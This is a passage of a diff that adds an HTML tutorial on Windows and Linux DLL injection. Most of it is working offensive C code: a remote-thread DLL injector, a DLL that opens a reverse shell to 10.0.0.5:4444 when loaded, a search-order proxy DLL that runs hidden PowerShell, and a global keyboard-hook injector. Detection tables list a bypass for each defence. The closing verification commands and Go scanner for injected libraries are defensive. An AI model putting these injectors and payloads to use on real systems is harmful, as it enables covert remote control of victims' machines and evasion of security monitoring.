+        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf(&#34;[+] Wrote DLL path to target memory\n&#34;);
+
+    /* Get the address of LoadLibraryA in kernel32.dll
+     * kernel32 is loaded at the same address in all processes
+     * on the same boot session (due to ASLR per-boot). */
+    HMODULE hKernel32 = GetModuleHandleA(&#34;kernel32.dll&#34;);
+    LPTHREAD_START_ROUTINE pLoadLibrary =
+        (LPTHREAD_START_ROUTINE)GetProcAddress(
+            hKernel32, &#34;LoadLibraryA&#34;);
+
+    if (!pLoadLibrary) {
+        printf(&#34;[-] GetProcAddress LoadLibraryA failed\n&#34;);
+        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf(&#34;[+] LoadLibraryA at 0x%p\n&#34;, pLoadLibrary);
+
+    /* Create a remote thread that calls LoadLibraryA(dll_path)
+     * lpParameter = remote_mem → the DLL path string */
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+        pLoadLibrary, remote_mem, 0, NULL);
+
+    if (!hThread) {
+        printf(&#34;[-] CreateRemoteThread failed: %lu\n&#34;, GetLastError());
+        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf(&#34;[+] Remote thread created (ID: %lu)\n&#34;,
+        GetThreadId(hThread));
+
+    /* Wait for LoadLibrary to complete */
+    WaitForSingleObject(hThread, INFINITE);
+
+    /* Get the thread exit code = LoadLibrary return value (HMODULE) */
+    DWORD exit_code = 0;
+    GetExitCodeThread(hThread, &amp;exit_code);
+    printf(&#34;[+] LoadLibrary returned: 0x%lx (base address of DLL)\n&#34;,
+        exit_code);
+
+    /* Cleanup */
+    CloseHandle(hThread);
+    VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+
+    return exit_code != 0;
+}
+
+int main(int argc, char **argv)
+{
+    if (argc &lt; 3) {
+        printf(&#34;Usage: %s &lt;process_name&gt; &lt;dll_path&gt;\n&#34;, argv[0]);
+        printf(&#34;Example: %s notepad.exe C:\\temp\\payload.dll\n&#34;, argv[0]);
+        return 1;
+    }
+
+    /* Convert narrow to wide for process name search */
+    wchar_t process_name[256];
+    mbstowcs(process_name, argv[1], 256);
+
+    DWORD pid = find_process_by_name(process_name);
+    if (!pid) {
+        printf(&#34;[-] Process &#39;%s&#39; not found\n&#34;, argv[1]);
+        return 1;
+    }
+    printf(&#34;[*] Found &#39;%s&#39; at PID %lu\n&#34;, argv[1], pid);
+
+    if (inject_dll(pid, argv[2])) {
+        printf(&#34;[+] DLL injected successfully\n&#34;);
+        return 0;
+    } else {
+        printf(&#34;[-] Injection failed\n&#34;);
+        return 1;
+    }
+}
+						</pre>
+						<h4 id="writing-a-dll-payload-for-dllmain">Writing a DLL Payload for DllMain</h4>
+						<pre class="c">
+/*
+ * payload.c — DLL that spawns a reverse shell on load
+ * Cross-compile from Linux:
+ *   x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -lws2_32
+ *
+ * The reverse shell fires when the DLL is loaded into any process.
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;ws2tcpip.h&gt;
+#include &lt;stdio.h&gt;
+
+#pragma comment(lib, &#34;ws2_32.lib&#34;)
+
+#define C2_HOST &#34;10.0.0.5&#34;
+#define C2_PORT 4444
+
+void spawn_reverse_shell(void)
+{
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0) return;
+
+    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
+        NULL, 0, 0);
+    if (sock == INVALID_SOCKET) return;
+
+    server.sin_family = AF_INET;
+    server.sin_port = htons(C2_PORT);
+    inet_pton(AF_INET, C2_HOST, &amp;server.sin_addr);
+
+    if (WSAConnect(sock, (struct sockaddr *)&amp;server,
+        sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    /* Redirect stdin/stdout/stderr to the socket */
+    memset(&amp;si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError = (HANDLE)sock;
+
+    /* Spawn cmd.exe with I/O connected to the socket */
+    CreateProcessA(NULL, &#34;cmd.exe&#34;, NULL, NULL, TRUE,
+        CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    closesocket(sock);
+    WSACleanup();
+}
+
+/* DllMain: called by the PE loader when the DLL is loaded.
+ * fdwReason = DLL_PROCESS_ATTACH on first load. */
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    switch (fdwReason) {
+    case DLL_PROCESS_ATTACH:
+        /* Disable the DLL_THREAD_ATTACH calls for performance */
+        DisableThreadLibraryCalls(hinstDLL);
+
+        /* Spawn the reverse shell in a new thread to avoid
+         * blocking the loader (which can deadlock the process) */
+        CreateThread(NULL, 0,
+            (LPTHREAD_START_ROUTINE)spawn_reverse_shell,
+            NULL, 0, NULL);
+        break;
+
+    case DLL_PROCESS_DETACH:
+        break;
+
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        break;
+    }
+
+    return TRUE;
+}
+						</pre>
+						<p>
+							<b>Important DllMain restrictions</b>
+							(from Microsoft docs): - Do not call
+							<code>LoadLibrary</code>
+							from DllMain
+							(loader lock deadlock) - Do not call functions that require the loader lock (most of user32,
+							shell32) -
+							<code>CreateThread</code>
+							is safe, but the thread shouldn't call synchronized functions - Always
+							<code>DisableThreadLibraryCalls</code>
+							to reduce overhead
+						</p>
+					</section>
+					<section>
+						<h3 id="dll-search-order-hijacking">DLL Search Order Hijacking</h3>
+						<p>
+							Windows searches for
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							s in a specific order. By placing a malicious
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							with the same name as a legitimate dependency, you can hijack the
+							load. The search order (for
+							<code>LoadLibrary(&#34;foo.dll&#34;)</code>
+							):
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Order</th>
+									<th align="center">Location</th>
+									<th align="center">Safe to Hijack?</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">1</td>
+									<td align="center">DLLs already loaded in memory</td>
+									<td align="center">No</td>
+								</tr>
+								<tr>
+									<td align="center">2</td>
+									<td align="center">Known DLLs registry key</td>
+									<td align="center">No (protected)</td>
+								</tr>
+								<tr>
+									<td align="center">3</td>
+									<td align="center">Application directory</td>
+									<td align="center">Yes (primary target)</td>
+								</tr>
+								<tr>
+									<td align="center">4</td>
+									<td align="center">System directory (<code>C:\Windows\System32</code>)</td>
+									<td align="center">No (protected, requires admin)</td>
+								</tr>
+								<tr>
+									<td align="center">5</td>
+									<td align="center">16-bit system directory</td>
+									<td align="center">No</td>
+								</tr>
+								<tr>
+									<td align="center">6</td>
+									<td align="center">Windows directory (<code>C:\Windows</code>)</td>
+									<td align="center">No (requires admin)</td>
+								</tr>
+								<tr>
+									<td align="center">7</td>
+									<td align="center">Current directory</td>
+									<td align="center">Yes</td>
+								</tr>
+								<tr>
+									<td align="center">8</td>
+									<td align="center">PATH directories</td>
+									<td align="center">Yes (but lower priority)</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							<b>DLL Proxying</b>
+							: When hijacking a legitimate
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							, forward all exported
+							functions to the real
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							so the application doesn't break:
+						</p>
+						<pre class="c">
+/*
+ * version_proxy.c — DLL proxy for version.dll
+ * Cross-compile:
+ *   x86_64-w64-mingw32-gcc -shared -o version.dll version_proxy.c \
+ *     -Wl,--out-implib,libversion.a
+ *
+ * Exports all functions, forwards them to the real version.dll,
+ * and adds a payload in DllMain.
+ */
+
+/* pragma to forward exports to the original DLL */
+#pragma comment(linker, &#34;/EXPORT:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA&#34;)
+#pragma comment(linker, &#34;/EXPORT:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW&#34;)
+#pragma comment(linker, &#34;/EXPORT:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA&#34;)
+/* ... all other exports ... */
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        /* Payload here — runs silently */
+        WinExec(&#34;powershell -WindowStyle Hidden -EncodedCommand ...&#34;, SW_HIDE);
+    }
+    return TRUE;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="reflective-dll-injection">Reflective DLL Injection</h3>
+						<p>
+							Reflective
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							Injection loads a
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							from memory
+							without calling
+							<code>LoadLibrary</code>
+							, which avoids: - The
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							being registered
+							in the loader's loaded module list -
+							<code>LoadLibrary</code>
+							-based
+							<abbr title="Endpoint Detection and Response">EDR</abbr>
+							hooks - The
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							needing to exist on disk
+						</p>
+						<p>
+							The idea: write a custom PE loader that parses the
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							's PE headers,
+							maps sections into memory, processes the import table, applies relocations, and calls
+							<code>DllMain</code>
+							. This loader is itself injected as shellcode into the target.
+						</p>
+						<p>
+							<b>Conceptual workflow</b>
+							:
+						</p>
+						<pre class="plaintext">
+[Load ReflectiveLoader shellcode into target]
+    │
+    ▼
+[ReflectiveLoader executes in target]
+    │
+    ├── Parse own PE headers to find sections
+    ├── Allocate memory for the DLL image
+    ├── Copy headers and sections
+    ├── Process import table (resolve all dependencies)
+    ├── Apply base relocations
+    ├── Call DllMain(DLL_PROCESS_ATTACH)
+    └── Return control to caller
+						</pre>
+						<p>
+							The ReflectiveLoader is typically written in position-independent assembly and prepended to
+							the
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							binary. The combined blob is then injected using any code injection
+							technique.
+						</p>
+					</section>
+					<section>
+						<h3 id="setwindowshookex-injection">SetWindowsHookEx Injection</h3>
+						<p>
+							<code>SetWindowsHookEx</code>
+							installs a hook procedure that Windows injects into all
+							<abbr title="Graphical User Interface">GUI</abbr>
+							processes. If the hook procedure is in a
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							, Windows loads that
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							into every process that receives messages of the hook type:
+						</p>
+						<pre class="c">
+/*
+ * hook_inject.cpp — SetWindowsHookEx DLL injection
+ * Cross-compile: x86_64-w64-mingw32-g++ -shared -o hook.dll hook.cpp
+ */
+
+#include &lt;windows.h&gt;
+
+HHOOK g_hook = NULL;
+
+/* The hook procedure — must be exported */
+extern &#34;C&#34; __declspec(dllexport) LRESULT CALLBACK HookProc(
+    int nCode, WPARAM wParam, LPARAM lParam)
+{
+    /* Every time this fires, we&#39;re executing in a target process.
+     * Only run the payload once per process. */
+    static BOOL payload_executed = FALSE;
+    if (!payload_executed) {
+        payload_executed = TRUE;
+        /* Payload code here */
+    }
+    return CallNextHookEx(g_hook, nCode, wParam, lParam);
+}
+
+/* Installer: run this in a separate process to deploy the hook */
+int main(void)
+{
+    HMODULE hModule = LoadLibraryA(&#34;hook.dll&#34;);
+    if (!hModule) return 1;
+
+    HOOKPROC proc = (HOOKPROC)GetProcAddress(hModule, &#34;HookProc&#34;);
+    if (!proc) return 1;
+
+    /* WH_KEYBOARD fires in every GUI process with a message loop */
+    g_hook = SetWindowsHookExA(WH_KEYBOARD, proc, hModule, 0);
+
+    if (!g_hook) {
+        printf(&#34;SetWindowsHookEx failed: %lu\n&#34;, GetLastError());
+        return 1;
+    }
+
+    printf(&#34;[+] Hook installed. Press any key in any window to trigger.\n&#34;);
+
+    /* Keep the message loop running to keep the hook alive */
+    MSG msg;
+    while (GetMessage(&amp;msg, NULL, 0, 0)) {
+        TranslateMessage(&amp;msg);
+        DispatchMessage(&amp;msg);
+    }
+
+    UnhookWindowsHookEx(g_hook);
+    return 0;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="appinit-dlls-deprecated-but-present">AppInit_DLLs (Deprecated but Present)</h3>
+						<p>
+							Older Windows versions load all
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							s listed in
+							<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>
+							into every process that loads
+							<code>user32.dll</code>
+							. Modern Windows (8+) requires
+							<code>RequireSignedAppInit_DLLs</code>
+							to be disabled and
+							<code>LoadAppInit_DLLs</code>
+							enabled. This is heavily monitored.
+						</p>
+						<pre class="plaintext">
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
+  AppInit_DLLs = &#34;C:\path\to\payload.dll&#34;
+  LoadAppInit_DLLs = 1 (DWORD)
+  RequireSignedAppInit_DLLs = 0 (DWORD)
+						</pre>
+					</section>
+					<section>
+						<h3 id="cross-compilation-from-linux">Cross-Compilation from Linux</h3>
+						<p>All Windows examples can be compiled on ArchLinux using mingw-w64:</p>
+						<pre class="bash">
+# Install mingw toolchain
+sudo pacman -S mingw-w64-gcc mingw-w64-headers
+
+# Compile 64-bit Windows DLL
+x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -lws2_32
+
+# Compile 64-bit Windows EXE
+x86_64-w64-mingw32-g++ -o dll_inject.exe dll_inject.cpp -static -lpsapi
+
+# Compile 32-bit (for 32-bit processes)
+i686-w64-mingw32-gcc -shared -o payload32.dll payload.c -lws2_32
+
+# Verify the output
+file payload.dll
+# payload.dll: PE32+ executable (DLL) (console) x86-64, for MS Windows
+
+# List exports
+objdump -x payload.dll | grep -A20 &#39;Export&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="detection-table-linux">Detection Table - Linux</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Technique</th>
+									<th align="center">Detection Method</th>
+									<th align="center">Bypass</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">LD_PRELOAD env var</td>
+									<td align="center"><code>/proc/PID/environ</code>grep</td>
+									<td align="center">Unset after init via clearenv</td>
+								</tr>
+								<tr>
+									<td align="center">/etc/ld.so.preload</td>
+									<td align="center">File existence check</td>
+									<td align="center">Hide via libc hook on open/stat</td>
+								</tr>
+								<tr>
+									<td align="center">GOT overwrite</td>
+									<td align="center">Compare GOT values to known libc addresses</td>
+									<td align="center">Restore after each call</td>
+								</tr>
+								<tr>
+									<td align="center">dlopen via ptrace</td>
+									<td align="center">strace logs</td>
+									<td align="center">Use direct syscall</td>
+								</tr>
+								<tr>
+									<td align="center">Constructor hooks</td>
+									<td align="center">Inspect loaded libraries in /proc/PID/maps</td>
+									<td align="center">Use LD_PRELOAD to hook maps output</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="detection-table-windows">Detection Table - Windows</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Technique</th>
+									<th align="center">Detection Method</th>
+									<th align="center">Bypass</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">LoadLibrary injection</td>
+									<td align="center">ETW events for CreateRemoteThread, LoadLibrary callstack</td>
+									<td align="center">Use NtCreateThreadEx, manual mapping</td>
+								</tr>
+								<tr>
+									<td align="center">SetWindowsHookEx</td>
+									<td align="center">Monitor SetWindowsHookEx API calls</td>
+									<td align="center">Use low-level keyboard/mouse hooks</td>
+								</tr>
+								<tr>
+									<td align="center">AppInit_DLLs</td>
+									<td align="center">Registry key monitoring</td>
+									<td align="center">Modern Windows ignores it anyway</td>
+								</tr>
+								<tr>
+									<td align="center">DLL hijacking</td>
+									<td align="center">Monitor DLL load events (Sysmon Event ID 7)</td>
+									<td align="center">Use signed DLLs, avoid common hijack targets</td>
+								</tr>
+								<tr>
+									<td align="center">Reflective DLL</td>
+									<td align="center">No LoadLibrary call -> no event 7, but RWX memory allocation</td>
+									<td align="center">Scatter sections across multiple allocations</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="verification-commands-linux">Verification Commands - Linux</h3>
+						<pre class="bash">
+# 1. Check LD_PRELOAD per process
+for pid in $(pgrep -f &#39;&#39;); do
+    echo &#34;=== PID $pid ===&#34;
+    cat /proc/$pid/environ 2&gt;/dev/null | tr &#39;\0&#39; &#39;\n&#39; | grep LD_PRELOAD
+done
+
+# 2. Check /etc/ld.so.preload
+cat /etc/ld.so.preload 2&gt;/dev/null
+
+# 3. List loaded SOs that aren&#39;t from standard paths
+cat /proc/PID/maps | grep &#39;\.so&#39; | grep -v &#39;/lib\|/usr/lib&#39;
+
+# 4. Check for GOT tampering (compare to known-good)
+objdump -R /proc/PID/exe | head -50
+
+# 5. Monitor dlopen calls
+sudo bpftrace -e &#39;uprobe:/lib64/ld-linux-x86-64.so.2:dlopen {
+    printf(&#34;PID=%d path=%s\n&#34;, pid, str(arg0)); }&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="verification-commands-windows">Verification Commands - Windows</h3>
+						<pre class="powershell">
+# 1. List loaded modules for a process
+Get-Process -Id 1234 | Select-Object -ExpandProperty Modules | Format-Table ModuleName, FileName
+
+# 2. Check AppInit_DLLs
+Get-ItemProperty -Path &#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&#34; -Name AppInit_DLLs
+
+# 3. Check for suspicious DLLs in application directories (Sysmon Event ID 7)
+Get-WinEvent -FilterHashtable @{LogName=&#34;Microsoft-Windows-Sysmon/Operational&#34;; ID=7} -MaxEvents 100
+
+# 4. List all injected threads (look for threads with start address in unknown modules)
+# Requires a kernel driver — use ProcessHacker or SystemInformer
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<ol>
+							<li><b>Calling 'system()' or 'WinExec' from DllMain</b> : These functions may trigger the loader lock. Use <code>CreateThread</code> to defer work.</li>
+						</ol>
+						<ol>
+							<li><b>Not handling 'DLL_THREAD_ATTACH'</b> : If you don't call <code>DisableThreadLibraryCalls()</code> , DllMain fires for every new thread - a performance drain and a detection indicator.</li>
+						</ol>
+						<ol>
+							<li><b>Assuming kernel32.dll address stability across boots</b> : ASLR changes the address every reboot. Always resolve addresses dynamically with <code>GetProcAddress</code> / <code>GetModuleHandle</code> .</li>
+						</ol>
+						<ol>
+							<li><b>For 32-bit vs 64-bit</b> : A 64-bit <abbr title="Dynamic Link Library">DLL</abbr> cannot be injected into a 32-bit process and vice versa. Use the correct toolchain ( <code>i686-w64-mingw32-gcc</code> for 32-bit).</li>
+						</ol>
+						<ol>
+							<li><b>Leaving debug symbols in the payload</b> : <code>strip payload.dll</code> before deployment. Debug symbols contain source paths and function names.</li>
+						</ol>
+						<ol>
+							<li><b>LD_PRELOAD with setuid binaries</b> : Linux ignores <code>LD_PRELOAD</code> on setuid binaries (secure-execution mode). This is a security feature - you cannot inject into <code>sudo</code> via <code>LD_PRELOAD</code> .</li>
+						</ol>
+						<ol>
+							<li><b>Forgetting that '/etc/ld.so.preload' affects setuid binaries</b> : Unlike <code>LD_PRELOAD</code> env var, <code>/etc/ld.so.preload</code> IS loaded by setuid binaries (glibc treats it as trusted). This makes it a powerful root-only persistence mechanism.</li>
+						</ol>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write a Go tool that reads
+							<code>/proc/PID/maps</code>
+							and reports the shared objects a running process
+							has loaded. Flag any library that resolves outside the standard search path and any mapping
+							that is both writable and executable, two signals that a process has been injected. Build a
+							small hook with
+							<code>gcc -shared -fPIC -o /tmp/libhook.so hook.c</code>
+							, launch a long-running target
+							such as
+							<code>sleep 3000</code>
+							, then attach the scanner to it before and after starting the target with
+							<code>LD_PRELOAD=/tmp/libhook.so</code>
+							and compare the output.
+						</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;bufio&#34;
+	&#34;fmt&#34;
+	&#34;os&#34;
+	&#34;path/filepath&#34;
+	&#34;strings&#34;
+)
+
+var standardDirs = []string{
+	&#34;/lib&#34;, &#34;/lib64&#34;, &#34;/usr/lib&#34;, &#34;/usr/lib64&#34;,
+}
+
+func isStandard(path string) bool {
+	for _, dir := range standardDirs {
+		if strings.HasPrefix(path, dir) {
+			return true
+		}
+	}
+	return false
+}
+
+func main() {
+	if len(os.Args) != 2 {
+		fmt.Fprintf(os.Stderr, &#34;usage: %s &lt;pid&gt;\n&#34;, os.Args[0])
+		os.Exit(2)
+	}
+
+	file, err := os.Open(filepath.Join(&#34;/proc&#34;, os.Args[1], &#34;maps&#34;))
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		if len(fields) &lt; 6 {
+			continue
+		}
+
+		mapping, perms, path := fields[0], fields[1], fields[len(fields)-1]
+
+		if !strings.Contains(path, &#34;.so&#34;) {
+			continue
+		}
+
+		var flags []string
+		if !isStandard(path) {
+			flags = append(flags, &#34;non-standard-path&#34;)
+		}
+		if strings.Contains(perms, &#34;w&#34;) &amp;&amp; strings.Contains(perms, &#34;x&#34;) {
+			flags = append(flags, &#34;writable-executable&#34;)
+		}
+
+		fmt.Printf(&#34;%-25s %-5s %s&#34;, mapping, perms, path)
+		if len(flags) &gt; 0 {
+			fmt.Printf(&#34;  &lt;-- %s&#34;, strings.Join(flags, &#34;, &#34;))
+		}
+		fmt.Println()
+	}
+}
+						</pre>
+						<p>
+							Run it as
+							<code>sudo go run scanner.go &lt;pid&gt;</code>
+							and confirm that the injected library shows up as a
+							non-standard mapping. Then try the same against a process started without
+							<code>LD_PRELOAD</code>
+							to see
+							the baseline.
+						</p>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man8/ld.so.8.html" target="_blank">ld.so(8) - dynamic linker/loader</a> - LD_PRELOAD, /etc/ld.so.preload, secure-execution mode</li>
+							<li><a class="icon-website" href="https://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html" target="_blank">GCC Function Attributes</a> - constructor and destructor attributes</li>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain" target="_blank">DllMain entry point - Microsoft Learn</a> - loader-lock restrictions</li>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order" target="_blank">Dynamic-Link Library Search Order - Microsoft Learn</a> - the documented search path</li>
+							<li><a class="icon-github" href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank">Reflective DLL Injection - Stephen Fewer</a> - the original reflective loader</li>
+							<li><a class="icon-website" href="https://en.wikipedia.org/wiki/Procedure_Linkage_Table" target="_blank">Procedure Linkage Table - Wikipedia</a> - GOT/PLT resolution mechanics</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
